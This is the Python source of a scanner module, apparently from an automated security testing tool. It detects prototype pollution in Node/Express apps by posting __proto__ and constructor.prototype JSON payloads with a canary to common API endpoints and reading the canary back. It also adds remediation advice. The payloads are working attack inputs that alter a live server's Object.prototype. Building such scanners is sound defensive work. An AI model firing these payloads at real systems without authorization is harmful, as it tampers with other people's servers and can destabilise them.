"""Stage 5: Prototype pollution on JSON-writing endpoints.

Many Node/Express applications copy the request body into an object without a
key filter, so `{"__proto__": {...}}` or `{"constructor": {"prototype": {...}}}
` reaches `Object.prototype` and every plain object in the process inherits it.

The detection is deliberately blunt and hard to argue with: send the payload
with a canary property, then read back an endpoint that returns a *freshly
created* object. If the canary shows up there, the prototype really was
polluted. No diffing, no heuristics, nothing that a merely permissive-looking
response can fake.

This mutates server state that does not go away on its own, so the canary is
unique per run and the payload list is configurable. It is left active by
default because a single POST with an extra key is a cheap, bounded action.
"""

import json
import secrets

from core.auth_harness import AuthHarness
from modules.base import BaseModule


# The two shapes that reach the prototype. `constructor.prototype` is the
# fallback for code that walks the chain explicitly, and for libraries that
# strip a literal `__proto__` key.
DEFAULT_PAYLOADS = ("__proto__", "constructor.prototype")

DEFAULT_ENDPOINTS = (
    "/api/profile", "/api/user", "/api/users/me", "/api/account",
    "/api/me", "/api/settings", "/api/preferences", "/api/update",
)


def _deep_set(target: dict, path: str, canary: str) -> None:
    """Write `{path: {canary: "1"}}` into `target`.

    Walking the segments explicitly is the whole point: a request body that
    carries `__proto__` as a *key* does not set the prototype, it sets an
    ordinary property called `__proto__`, unless the receiving code walks the
    chain itself. Both forms are sent because applications differ.
    """
    parts = path.split(".")
    node = target
    for part in parts[:-1]:
        node = node.setdefault(part, {})
    node[parts[-1]] = {canary: "1"}


# Returned by _probe when the reflect endpoint just hands the payload back.
ECHO = object()

# Returned by _probe when the target throttled us. Distinct from a plain
# refusal: 403 means this endpoint will not take the write, 429 means the
# target is asking us to slow down and the run has to stop.
BLOCKED = object()


def _find_canary(value, canary: str) -> bool:
    """Whether the canary appears as a key anywhere in a decoded response."""
    if isinstance(value, dict):
        if canary in value:
            return True
        return any(_find_canary(item, canary) for item in value.values())
    if isinstance(value, list):
        return any(_find_canary(item, canary) for item in value)
    return False


class PrototypePollution(BaseModule):
    id = "prototype_pollution"
    name = "Prototype Pollution"
    stage = 5
    detectability = "medium"
    depends_on = []
    active = True

    async def run(self) -> str:
        cfg = self._cfg()
        base = self._base_url()
        if not base:
            self.state.skip_module(self.id, "no base URL")
            return "skipped"

        # On by default — the canary is inert and unique per run — but
        # switchable, because a target that cannot tolerate a stray property
        # on Object.prototype should be able to say so.
        if cfg.get("enabled", True) is False:
            self.state.skip_module(self.id, "disabled in config")
            return "skipped"

        harness = AuthHarness(self.config)
        identities = await harness.establish_all(base)
        identity = identities[0].name if identities else None

        targets = self._endpoints(cfg, base)
        if not targets:
            self.state.skip_module(
                self.id,
                "no JSON-writing endpoint (set modules.prototype_pollution.endpoints)",
            )
            return "skipped"

        reflect = self._absolute(str(cfg.get("reflect_endpoint") or "")) \
            or targets[0]
        canary = f"__pp_{secrets.token_hex(8)}__"
        methods = self._methods(cfg)
        payloads = [str(p) for p in (cfg.get("payloads") or DEFAULT_PAYLOADS)
                    if p]

        # Stop at the first confirmation. Every payload past it would be
        # re-detecting the same pollution — the canary is identical across the
        # run — so the extra requests would only add findings for one root
        # cause while writing more junk onto a live server's prototype.
        finding = None
        echoed = False
        blocked = False
        for path in payloads:
            for url in targets:
                for method in methods:
                    finding = await self._probe(
                        harness, identity, url, method, path, canary, reflect,
                    )
                    if finding is ECHO:
                        echoed = True
                        finding = None
                    if finding is BLOCKED:
                        blocked = True
                        finding = None
                    if finding or echoed or blocked:
                        break
                if finding or echoed or blocked:
                    break
            if finding or echoed or blocked:
                break

        if blocked and not finding:
            # Keep going after a 429 is how an agent gets an address blocked.
            self.state.skip_module(
                self.id, "target rate limited the scan; stopped early")
            return "skipped"

        if echoed:
            # The read came back with the payload we just sent, so the canary
            # was never evidence of anything. Reporting it would put a finding
            # in front of a triager for every target with such an endpoint.
            self.state.skip_module(
                self.id,
                "reflect endpoint echoes the request body; signal unusable")
            return "skipped"

        if finding:
            self.state.add_finding(**finding)
            self.log(f"prototype pollution confirmed via {finding['asset_keys'][0]}")
        else:
            self.log("prototype pollution: no confirmation")

        self.state.complete_module(self.id)
        return "done"

    async def _probe(self, harness: AuthHarness, identity, url: str,
                     method: str, path: str, canary: str, reflect: str):
        """Send one payload and check whether the prototype actually moved."""
        body = {}
        _deep_set(body, path, canary)
        sent = await self._post(harness, identity, url, method, json.dumps(body))
        status = sent.get("status", 0)
        if status in self._waf_codes():
            return BLOCKED
        if status >= 400:
            return None

        after = await self._get_json(harness, identity, reflect)
        if after == body:
            return ECHO
        if not _find_canary(after, canary):
            return None

        return {
            "title": (f"Prototype pollution via {path!r} on {url}"),
            "severity": "HIGH",
            "confidence": "CONFIRMED",
            "category": "Prototype Pollution",
            "description": (
                f"Sending {method} to {url} with a {path!r} key in the JSON body "
                f"wrote {canary!r} onto Object.prototype. A subsequent read of "
                f"{reflect} — an endpoint that builds a fresh object — returned "
                "the injected key, so the pollution is process-wide rather than "
                "confined to the submitted record."
            ),
            "evidence": [json.dumps({
                "endpoint": url,
                "method": method,
                "payload_key": path,
                "canary": canary,
                "write_status": sent.get("status", 0),
                "reflect_endpoint": reflect,
                "reflect_response": after,
            })],
            "asset_keys": [f"url:{url}"],
            "remediation": (
                "Reject __proto__, constructor and prototype keys from "
                "untrusted input, merge with a null-prototype object or an "
                "explicit key allowlist, and freeze Object.prototype. Recursive "
                "merge helpers and query-string parsers are the usual entry "
                "point."
            ),
            "verified": True,
        }

    # ── Plumbing ─────────────────────────────────────────────────

    def _endpoints(self, cfg: dict, base: str) -> list:
        configured = cfg.get("endpoints") or DEFAULT_ENDPOINTS
        urls = []
        for candidate in configured:
            url = self._absolute(str(candidate))
            if url and url not in urls:
                urls.append(url)
        # Prefer discovered JSON-writing surface over hardcoded guesses:
        # api_endpoint assets with write methods are endpoints the app
        # actually exposes, not paths hoped to exist.
        for asset in self.state.get_assets_by_type("api_endpoint"):
            attrs = asset.get("attrs", {}) or {}
            methods = [m.upper() for m in (attrs.get("methods") or [])]
            if not any(m in ("POST", "PUT", "PATCH") for m in methods):
                continue
            value = str(asset.get("value", "") or "").replace(
                "{id}", "1").replace("{Id}", "1")
            if value.startswith(("http://", "https://")) \
                    and value not in urls:
                urls.insert(0, value)
        return urls

    def _methods(self, cfg: dict) -> list:
        methods = cfg.get("methods") or ["POST", "PUT"]
        return [str(m).upper() for m in methods if str(m).upper() in
                ("POST", "PUT", "PATCH")]

    def _base_url(self) -> str:
        return str(self.target.get("base_url")
                   or (self.base_url if self.domain else ""))

    def _absolute(self, path: str) -> str:
        path = (path or "").strip()
        if not path:
            return ""
        if path.startswith(("http://", "https://", "ws://", "wss://")):
            return path
        base = self._base_url().rstrip("/")
        return f"{base}/{path.lstrip('/')}" if base else ""

    async def _get_json(self, harness: AuthHarness, identity, url: str):
        kwargs = {"method": "GET", "output": "body"}
        if identity:
            result = await harness.request(identity, url, **kwargs)
        else:
            result = await harness.request_anonymous(url, **kwargs)
        if result.get("status", 0) in self._waf_codes():
            self.state.record_waf_block(url, result.get("status", 0))
        if result.get("status", 0) != 200 or not result.get("body"):
            return None
        try:
            return json.loads(result["body"])
        except (TypeError, ValueError):
            return None

    async def _post(self, harness: AuthHarness, identity, url: str,
                    method: str, data: str) -> dict:
        kwargs = {
            "method": method,
            "headers": {"Content-Type": "application/json"},
            "data": data,
        }
        if identity:
            result = await harness.request(identity, url, **kwargs)
        else:
            result = await harness.request_anonymous(url, **kwargs)
        if result.get("status", 0) in self._waf_codes():
            self.state.record_waf_block(url, result.get("status", 0))
        return result

    def _waf_codes(self) -> set:
        codes = (self.waf_config or {}).get("block_codes") or [429, 503]
        return set(codes) if isinstance(codes, (list, tuple, set)) else {429, 503}

    def _cfg(self) -> dict:
        cfg = self.config.get("modules", {}).get(self.id, {})
        return cfg if isinstance(cfg, dict) else {}
